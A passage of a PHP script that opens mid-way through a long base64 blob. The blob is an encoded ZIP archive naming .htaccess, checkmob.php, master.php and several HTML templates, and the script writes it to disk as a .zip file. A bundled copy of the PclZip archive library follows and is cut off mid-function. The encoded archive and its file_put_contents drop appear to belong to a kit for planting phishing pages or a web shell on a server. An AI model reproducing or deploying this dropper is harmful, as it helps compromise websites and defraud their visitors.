EmLlcgsYx1CfMaKvrtcMEW14NGqcBlWp8N09bRzzIoXFS4UJ+XlJBjOIJnhWhP7yFWCPIa8jBZdKm+D20OGZLiskjUsG9ZrM6unr3moC+I1G68+FNjNdsBn38LMvrcsqIHbfGUEVnuEoUeFqCq/AGcf0C3XoJvi8hCEV4gIzHZEgAMATWyya+oPetRTJ7bheM7VBw9bYrcqcTeAe30adai3v1Et3za3bdbdAZ10da9qHVb3WSt5LSNKT0l/1lUJVddvx54LDjf+30P1BLAwQUAAAACAAEETJPCyR0wv8AAAB5AQAACwAAAHp6emNvZGUudHh0VU/RSsMwFH32L0IokkJNtUWH1lpEinuQbXSdLzJCF69tMWtqkmJB/HfTlToWLrnck3PuOblP2qpFzk6asVCMMKUU0/2OaaOMFPIbFHHYOs1e0+xtnucrtrEDe3xOF/nWjU60VsIUtKLgQDDCHsIX9jpS3Kj+QMSyWqnJEfZwKWUpALvuj8Mru4h3SrC6qQ1xI2SP0/f9sP9LGRJe3s5uRvhA02Bka4gVeuhpk70sVzmzzZpXxrR3vj+IaXhFg+uQBsHM58UnaD/pNKiihMbExyTn73Jf1E18+uH5cp1v8Wg5hFGgO2GmmNADH9z/3w8oF1IDmvAz4JWchNFv8vAHUEsBAh8AFAAAAAgAcLwKT4mi9kFbAAAAXgAAAAkAJAAAAAAAAAAgAAAAAAAAAC5odGFjY2VzcwoAIAAAAAAAAQAYANvHlii7T9UBJkRoboOv1QEmRGhug6/VAVBLAQIfABQAAAAIAKWG/0zcdURALAkAABUWAAAMACQAAAAAAAAAIAAAAIIAAABjaGVja21vYi5waHAKACAAAAAAAAEAGAAAZ/3Q1SjUAX4HaW6Dr9UBfgdpboOv1QFQSwECHwAUAAAACABOtI1PYMi9y/UHAADQFQAACgAkAAAAAAAAACAAAADYCQAAbWFzdGVyLnBocAoAIAAAAAAAAQAYACEDAVbssdUBmFVpboOv1QGYVWlug6/VAVBLAQIfABQAAAAIANKYjE9RABoN2Q0AAOdOAAAJACQAAAAAAAAAIAAAAPURAAB0cGwxLmh0bWwKACAAAAAAAAEAGADCKM4hBrHVAdDKaW6Dr9UB8fyJDKyw1QFQSwECHwAUAAAACADgmIxP+u9no3YHAAAsFwAACQAkAAAAAAAAACAAAAD1HwAAdHBsMi5odG1sCgAgAAAAAAABABgA2OAqMAax1QELZ2pug6/VAZ5J0ESrsNUBUEsBAh8AFAAAAAgA8piMT8blz5zVCAAAxx0AAAkAJAAAAAAAAAAgAAAAkicAAHRwbDMuaHRtbAoAIAAAAAAAAQAYAGrq3kUGsdUBHo5qboOv1QEmXrB8q7DVAVBLAQIfABQAAAAIAPaYjE/LP6bcfgIAAJcIAAAJACQAAAAAAAAAIAAAAI4wAAB0cGw0Lmh0bWwKACAAAAAAAAEAGACX56dJBrHVAT7cam6Dr9UBg3uPB6uw1QFQSwECHwAUAAAACAAMmYxPVFAkmvoJAAD2HgAACQAkAAAAAAAAACAAAAAzMwAAdHBsNS5odG1sCgAgAAAAAAABABgAQgZVYgax1QFLA2tug6/VAVI/qVqrsNUBUEsBAh8AFAAAAAgAG5mMT5sUIZZXBAAASwoAAAkAJAAAAAAAAAAgAAAAVD0AAHRwbDYuaHRtbAoAIAAAAAAAAQAYAHd9j3MGsdUBXiprboOv1QHkaeWOqrDVAVBLAQIfABQAAAAIACuZjE9VgXHc2QQAAAQNAAAJACQAAAAAAAAAIAAAANJBAAB0cGw3Lmh0bWwKACAAAAAAAAEAGACW0TWEBrHVAYh4a26Dr9UBUYZqYquw1QFQSwECHwAUAAAACABAmYxPJ5k3eYYKAAB7IQAACQAkAAAAAAAAACAAAADSRgAAdHBsOC5odG1sCgAgAAAAAAABABgAjUZ7mwax1QGoxmtug6/VAZnGZA+ssNUBUEsBAh8AFAAAAAgAA5WMT3vdCBlVCwAA/yQAAAkAJAAAAAAAAAAgAAAAf1EAAHRwbDkuaHRtbAoAIAAAAAAAAQAYANDvBW4CsdUBsO1rboOv1QFmM5OUqrDVAVBLAQIfABQAAAAIAAQRMk8LJHTC/wAAAHkBAAALACQAAAAAAAAAIAAAAPtcAAB6enpjb2RlLnR4dAoAIAAAAAAAAQAYAPnLF8WsbdUBvhRsboOv1QG+FGxug6/VAVBLBQYAAAAADQANAKUEAAAjXgAAAAA="); 
file_put_contents($foldername."/".$myfilename.".zip",$data); 



if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
  define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
}

if (!defined('PCLZIP_SEPARATOR')) {
  define( 'PCLZIP_SEPARATOR', ',' );
}

if (!defined('PCLZIP_ERROR_EXTERNAL')) {
  define( 'PCLZIP_ERROR_EXTERNAL', 0 );
}

if (!defined('PCLZIP_TEMPORARY_DIR')) {
  define( 'PCLZIP_TEMPORARY_DIR', '' );
}

if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) {
  define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );
}


$g_pclzip_version = "2.8.2";

define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );

define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );

class PclZip
{
  var $zipname = '';

  var $zip_fd = 0;

  var $error_code = 1;
  var $error_string = '';
  
  var $magic_quotes_status;

function PclZip($p_zipname)
{

  if (!function_exists('gzopen'))
  {
    die('Abort '.basename(__FILE__).' : Missing zlib extensions');
  }

  $this->zipname = $p_zipname;
  $this->zip_fd = 0;
  $this->magic_quotes_status = -1;

  return;
}

function create($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
                                           ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Invalid number / type of arguments");
        return 0;
      }
    }
  }
  
  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      if ($v_string != '') {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
      else {
      }
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function add($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                 PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
											   ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function listContent()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $p_list = array();
  if (($v_result = $this->privList($p_list)) != 1)
  {
    unset($p_list);
    return(0);
  }

  return $p_list;
}

function extract()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_BY_NAME => 'optional',
                                                 PCLZIP_OPT_BY_EREG => 'optional',
                                                 PCLZIP_OPT_BY_PREG => 'optional',
                                                 PCLZIP_OPT_BY_INDEX => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											    ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);


  $p_list = array();
  $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                     $v_remove_all_path, $v_options);
  if ($v_result < 1) {
    unset($p_list);
    return(0);
  }

  return $p_list;
}



function extractByIndex($p_index)
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											   ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
      if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
        $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
      }
      else {
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }


  $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
  $v_options_trick = array();
  $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                      array (PCLZIP_OPT_BY_INDEX => 'optional' ));
  if ($v_result != 1) {
      return 0;
  }
  $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

  $this->privOptionDefaultThreshold($v_options);

  if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
      return(0);
  }

  return $p_list;
}

function delete()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();

  $v_size = func_num_args();

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                      array (PCLZIP_OPT_BY_NAME => 'optional',
                                             PCLZIP_OPT_BY_EREG => 'optional',
                                             PCLZIP_OPT_BY_PREG => 'optional',
                                             PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        return 0;
    }
  }

  $this->privDisableMagicQuotes();

  $v_list = array();
  if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
    $this->privSwapBackMagicQuotes();
    unset($v_list);
    return(0);
  }

  $this->privSwapBackMagicQuotes();

  return $v_list;
}

function deleteByIndex($p_index)
{
  
  $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

  return $p_list;
}

function properties()
{

  $this->privErrorReset();

  $this->privDisableMagicQuotes();

  if (!$this->privCheckFormat()) {
    $this->privSwapBackMagicQuotes();
    return(0);
  }

  $v_prop = array();
  $v_prop['comment'] = '';
  $v_prop['nb'] = 0;
  $v_prop['status'] = 'not_exist';

  if (@is_file($this->zipname))
  {
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      $this->privSwapBackMagicQuotes();
      
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      return 0;
    }

    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return 0;
    }

    $this->privCloseFd();

    $v_prop['comment'] = $v_central_dir['comment'];
    $v_prop['nb'] = $v_central_dir['entries'];
    $v_prop['status'] = 'ok';
  }

  $this->privSwapBackMagicQuotes();

  return $v_prop;
}

function duplicate($p_archive)
{
  $v_result = 1;

  $this->privErrorReset();

  if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
  {

    $v_result = $this->privDuplicate($p_archive->zipname);
  }

  else if (is_string($p_archive))
  {

    if (!is_file($p_archive)) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
      $v_result = PCLZIP_ERR_MISSING_FILE;
    }
    else {
      $v_result = $this->privDuplicate($p_archive);
    }
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}

function merge($p_archive_to_add)
{
  $v_result = 1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
  {

    $v_result = $this->privMerge($p_archive_to_add);
  }

  else if (is_string($p_archive_to_add))
  {

    $v_object_archive = new PclZip($p_archive_to_add);

    $v_result = $this->privMerge($v_object_archive);
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}



function errorCode()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorCode());
  }
  else {
    return($this->error_code);
  }
}

function errorName($p_with_code=false)
{
  $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                    PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                    PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                    PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                    PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                    PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                    PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                    PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                    PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                    PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                    PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                    PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                    PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                    PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                    PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                    PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                    PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                    PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                    PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                    ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                    ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                  );

  if (isset($v_name[$this->error_code])) {
    $v_value = $v_name[$this->error_code];
  }
  else {
    $v_value = 'NoName';
  }

  if ($p_with_code) {
    return($v_value.' ('.$this->error_code.')');
  }
  else {
    return($v_value);
  }
}

function errorInfo($p_full=false)
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorString());
  }
  else {
    if ($p_full) {
      return($this->errorName(true)." : ".$this->error_string);
    }
    else {
      return($this->error_string." [code ".$this->error_code."]");
    }
  }
}





function privCheckFormat($p_level=0)
{
  $v_result = true;

  clearstatcache();

  $this->privErrorReset();

  if (!is_file($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
    return(false);
  }

  if (!is_readable($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
    return(false);
  }




  return $v_result;
}

function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
{
  $v_result=1;
  
  $i=0;
  while ($i<$p_size) {

    if (!isset($v_requested_options[$p_options_list[$i]])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

      return PclZip::errorCode();
    }

    switch ($p_options_list[$i]) {
      case PCLZIP_OPT_PATH :
      case PCLZIP_OPT_REMOVE_PATH :
      case PCLZIP_OPT_ADD_PATH :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_THRESHOLD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }
        
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
